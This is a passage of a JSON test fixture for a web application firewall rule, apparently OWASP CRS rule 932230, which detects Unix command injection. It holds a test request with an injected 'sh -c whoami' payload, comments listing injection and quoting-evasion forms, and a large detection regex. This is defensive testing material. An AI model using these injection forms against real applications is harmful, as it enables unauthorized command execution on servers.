            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Accept-Encoding" : "gzip, deflate, br",
            "Accept-Language" : "en-us,en;q=0.5"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=time+sh+-c+whoami",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932230 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932230,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Unix command injection ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Unix command injections."
        }, {
          "type" : "Comment",
          "text" : " A command injection takes a form such as:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   foo.jpg;uname -a"
        }, {
          "type" : "Comment",
          "text" : "   foo.jpg||uname -a"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " The vulnerability exists when an application executes a shell command"
        }, {
          "type" : "Comment",
          "text" : " without proper input escaping/validation."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule is also triggered by an Oracle WebLogic Remote Command Execution exploit:"
        }, {
          "type" : "Comment",
          "text" : " [ Oracle WebLogic vulnerability CVE-2017-10271 - Exploit tested: https://www.exploit-db.com/exploits/43458 ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " To prevent false positives, we look for a 'starting sequence' that"
        }, {
          "type" : "Comment",
          "text" : " precedes a command in shell syntax, such as: ; | & $( ` <( >("
        }, {
          "type" : "Comment",
          "text" : " Anatomy of the regexp with examples of patterns caught:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " 1. Starting tokens"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " ;        ;ifconfig"
        }, {
          "type" : "Comment",
          "text" : " \\{       {ifconfig}"
        }, {
          "type" : "Comment",
          "text" : " \\|       |ifconfig"
        }, {
          "type" : "Comment",
          "text" : " \\|\\|     ||ifconfig"
        }, {
          "type" : "Comment",
          "text" : " &        &ifconfig"
        }, {
          "type" : "Comment",
          "text" : " &&       &&ifconfig"
        }, {
          "type" : "Comment",
          "text" : " \\n       ;\\nifconfig"
        }, {
          "type" : "Comment",
          "text" : " \\r       ;\\rifconfig"
        }, {
          "type" : "Comment",
          "text" : " \\$\\(     $(ifconfig)"
        }, {
          "type" : "Comment",
          "text" : " \\$\\(\\(   $((ifconfig))"
        }, {
          "type" : "Comment",
          "text" : " \\$\\[     $[2+2]"
        }, {
          "type" : "Comment",
          "text" : " `        `ifconfig`"
        }, {
          "type" : "Comment",
          "text" : " \\${      ${ifconfig}"
        }, {
          "type" : "Comment",
          "text" : " <\\(      <( ifconfig )"
        }, {
          "type" : "Comment",
          "text" : " >\\(      >( ifconfig )"
        }, {
          "type" : "Comment",
          "text" : " \\(\\s*\\)  a() ( ifconfig; ); a"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " 2. Command prefixes"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " {        { ifconfig }"
        }, {
          "type" : "Comment",
          "text" : " \\s*\\(\\s* ( ifconfig )"
        }, {
          "type" : "Comment",
          "text" : " \\w+=(?:[^\\s]*|\\$.*|\\$.*|<.*|>.*|\\'.*\\'|\\\".*\\\")\\s+   VARNAME=xyz ifconfig"
        }, {
          "type" : "Comment",
          "text" : " !\\s*     ! ifconfig"
        }, {
          "type" : "Comment",
          "text" : " \\$       $ifconfig"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " 3. Quoting"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " '        'ifconfig'"
        }, {
          "type" : "Comment",
          "text" : " \\\"       \"ifconfig\""
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " 4. Paths"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " [\\?\\*\\[\\]\\(\\)\\-\\|+\\w'\\\"\\./\\x5c]+/   /sbin/ifconfig, /s?in/./ifconfig, /s[a-b]in/ifconfig etc."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " An effort was made to combat evasions by shell quoting (e.g. 'ls',"
        }, {
          "type" : "Comment",
          "text" : " 'l'\"s\", \\l\\s are all valid). ModSecurity has a t:cmdLine"
        }, {
          "type" : "Comment",
          "text" : " transformation built-in to deal with this, but unfortunately, it"
        }, {
          "type" : "Comment",
          "text" : " replaces ';' characters and lowercases the payload, which is less"
        }, {
          "type" : "Comment",
          "text" : " useful for this case. However, emulating the transformation makes"
        }, {
          "type" : "Comment",
          "text" : " the regexp more complex."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This is the base Rule to prevent Unix Command Injection"
        }, {
          "type" : "Comment",
          "text" : " for prefix + two and three characters."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Rule relations:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "  .932230 (base rule, PL1, targets prefix + two and three character commands)"
        }, {
          "type" : "Comment",
          "text" : "  ..932231 (stricter sibling, PL2, targets prefix + the source shortcut command)"
        }, {
          "type" : "Comment",
          "text" : "  ..932232 (stricter sibling, PL3, targets prefix + additional command words)"
        }, {
          "type" : "Comment",
          "text" : "  .932235 (base rule, PL1, targets prefix + known command word of length > 3 without evasion)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "  .932250 (base rule, PL1, targets two and three character commands)"
        }, {
          "type" : "Comment",
          "text" : "  .932260 (base rule, PL1, targets known command word of length > 3 without evasion)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "  .932240 (generic detection, PL2, targets generic evasion attempts)"
        }, {
          "type" : "Comment",
          "text" : "  .932236 (stricter sibling of 932230, 932235, 932250, 932260, PL2,"
        }, {
          "type" : "Comment",
          "text" : "       - with and without prefix"
        }, {
          "type" : "Comment",
          "text" : "       - words of any length)"
        }, {
          "type" : "Comment",
          "text" : "  ..932239 (sibling of 932236, PL2,"
        }, {
          "type" : "Comment",
          "text" : "       - with and without prefix"
        }, {
          "type" : "Comment",
          "text" : "       - words of any length"
        }, {
          "type" : "Comment",
          "text" : "       - targets request headers user-agent and referer only"
        }, {
          "type" : "Comment",
          "text" : "       - excluded words: known user-agents)"
        }, {
          "type" : "Comment",
          "text" : "  ..932238 (stricter sibling of 932236, PL3,"
        }, {
          "type" : "Comment",
          "text" : "       - no excluded words)"
        }, {
          "type" : "Comment",
          "text" : "  .932237 (stricter sibling of 932230, 932235, 932250, 932260, PL3,"
        }, {
          "type" : "Comment",
          "text" : "       - targets request headers user-agent and referer only"
        }, {
          "type" : "Comment",
          "text" : "       - without prefix"
        }, {
          "type" : "Comment",
          "text" : "       - with word boundaries"
        }, {
          "type" : "Comment",
          "text" : "       - words of any length"
        }, {
          "type" : "Comment",
          "text" : "       - excluded words: known user-agents)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932230.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932230"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "(?i)(?:b[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?u[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?s[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?y[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?b[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?o[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?x|(?:c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?o[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?n[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?d|e[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:n[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?v|v[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?l)|w[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?h)[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:[\\s\\x0b&\\),<>\\|]|$).*|[ls][\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?r[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?e|n[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?o[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?h[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?u[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?p|t[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?i[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?e[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:(?:[\\s\\x0b&\\),<>\\|]|$).*|o[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?u[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t)|[\\n\\r;=`\\{]|\\|\\|?|&&?|\\$(?:\\(\\(?|[\\[\\{])|<(?:\\(|<<)|>\\(|\\([\\s\\x0b]*\\))[\\s\\x0b]*(?:[\\$\\{]|(?:[\\s\\x0b]*\\(|!)[\\s\\x0b]*|[0-9A-Z_a-z]+=(?:[^\\s\\x0b]*|\\$(?:.*|.*)|[<>].*|'[^']*'|\\\"[^\\\"]*\\\")[\\s\\x0b]+)*[\\s\\x0b]*[\\\"']*(?:[\\\"'-\\+\\--9\\?A-\\]_a-z\\|]+/)?[\\\"'\\x5c]*(?:(?:7[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?z[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:[arx][\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?)?|(?:b[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?z[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?z|c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:[89][\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?9|m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?p|s[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?h)|d[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:n[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?)?f|e[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:n[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?v|q[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?n|s[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?h)|f[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:[dg]|m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t)|(?:h[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?u|u[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?d)[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?p|i[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?r[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?b|j[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:j[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?s|q)|[kz][\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?s[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?h|m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?r|p[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:d[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?b|k[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?g|t[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?x|x[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?z)|r[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?p|m[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?t)|s[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?p|e[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?d|(?:s[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?)?h|v[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?n)|t[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?c|b[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?l)|w[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:3[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?m|c)|x[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:x[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?d|z)|y[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?u[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?m)[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?|l[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:s[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?|z[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:4[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?)?))(?:[\\s\\x0b&\\),<>\\|]|$).*|a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:a[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?-[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:(?:[&\\),<>\\|]|$){1,10}|(?:[\\-\\.0-9A-Z_a-z][\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?){1,10}(?:[\\s\\x0b&\\),<>\\|\\}]|$){1,10})|r[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?j[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:[\\s\\x0b&\\),<>\\|]|$).*)|g[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?c[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:(?:[&\\),<>\\|]|$){1,10}|(?:[\\-\\.0-9A-Z_a-z][\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?){1,10}(?:[\\s\\x0b&\\),<>\\|\\}]|$){1,10})|(?:d[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?b|[hr][\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?c|p[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?g)[\\\"'\\)\\[\\x5c]*(?:(?:(?:\\|\\||&&)[\\s\\x0b]*)?\\$[!#\\(\\*\\-0-9\\?@_a-\\{]*)?\\x5c?(?:[\\s\\x0b&\\),<>\\|]|$).*))\\b"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932230
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Unix Command Injection (2-3 chars)"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-unix"
        }, {
          "type" : "Action",
          "action_type" : "tag",
